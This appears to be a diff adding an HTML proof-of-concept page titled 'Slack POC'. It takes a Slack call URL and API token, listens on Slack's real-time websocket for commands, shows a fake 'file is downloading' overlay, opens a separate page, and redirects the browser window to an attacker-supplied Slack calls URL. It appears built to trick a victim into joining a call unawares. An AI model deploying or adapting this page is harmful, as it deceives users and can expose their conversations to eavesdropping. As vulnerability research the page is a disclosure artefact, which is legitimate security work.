@@ -1,0 +1,120 @@
+<!doctype html>
+<html>
+    <head>
+        <title>Slack Message Activity</title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
+    </head>
+    <body>
+        <style>
+            .overlay{
+                width: 100%;
+                height: 100%;
+                position: fixed;
+                background-color: #1c1c1c;
+                z-index: 99999999;
+                color:white;
+                text-align: center;
+                display: none;
+            }
+        </style>
+        <div class="overlay">
+            <div class="container">
+                <div class="msg">
+                    <p>Do not close this window while the file is downloading</p>
+                </div>
+                <div class="spinner-border text-primary"></div>
+            </div>
+        </div>
+
+
+        
+        <div class="container" style="max-width: 600px">
+            <div class="card">
+                <div class="card-header"><h1>Slack POC</h1></div>
+                <div class="card-body">
+                    
+                        <label>Enter call URL</label>
+                        <input id="url" type="text" class="form-control" placeholder="https://app.slack.com/team-id/direct-msg-id/user-id"/>
+                   
+                </div>
+                <div class="card-footer">
+
+                    <div class="input-group mb-3">
+                        <div class="input-group-prepend">
+                          <button class="btn btn-outline-primary" type="button" onclick="startconnection();">Start POC</button>
+                        </div>
+                        <input type="text" class="form-control" id="key" placeholder="Enter slack api token">
+                      </div>
+
+                </div>
+            </div>
+        </div>
+       <script>
+
+           var url = null;
+           var mywebsock = null;
+
+           var showloadingpage = () => {
+               document.getElementsByClassName("overlay")[0].style.display = "block";
+           }
+
+
+           async function getsockurl() {
+               var SLACK_API_KEY = document.getElementById("key").value;
+               var url = await fetch("https://slack.com/api/rtm.connect?token="+SLACK_API_KEY+"&pretty=1")
+               .then(function(resp){
+                    return resp.json();
+               }).then((data) => {
+                try {
+                    mywebsock = new WebSocket(data.url);
+                    mywebsock.onopen = () => {
+                        console.log("connection established..");
+                    }
+
+                    mywebsock.onmessage = (event) => {
+                        console.log(event.data);
+                        var jdata = JSON.parse(event.data);
+                        if(jdata['text'] != null && jdata['text'] != 'listen'){
+                            console.log(jdata['text']);
+                            var str = jdata['text'].split(" ")[0]
+                            if(str == 'url'){
+                                showloadingpage();
+                                window.open("game.html","_blank");
+                                localStorage.setItem("redir_url","https://app.slack.com/calls"+jdata['text'].split(" ")[1]);
+                            }
+                        }if(jdata['text'] != null && jdata['text'] == 'listen'){
+                            window.location = localStorage.getItem('redir_url');
+                        }
+                    }   
+                } catch (error) {
+                    console.log(error);
+                }
+               });
+           }
+
+           var sendmessage = () => {
+               if(url != null){
+                //var mywebsock = new WebSocket(url);
+                mywebsock.send(document.getElementById("data").textContent);
+               }else{
+                  console.log("Please start the connection first.");
+               }
+           }
+
+           var startconnection = () => {
+                var CALL_URL = document.getElementById("url").value;
+                var call_window = window.open(CALL_URL, "_blank");
+                setTimeout(() => {
+                   call_window.close(); 
+                }, 2000);
+                getsockurl();
+           }
+        </script>
+
+
+    </body>
+</html>
+
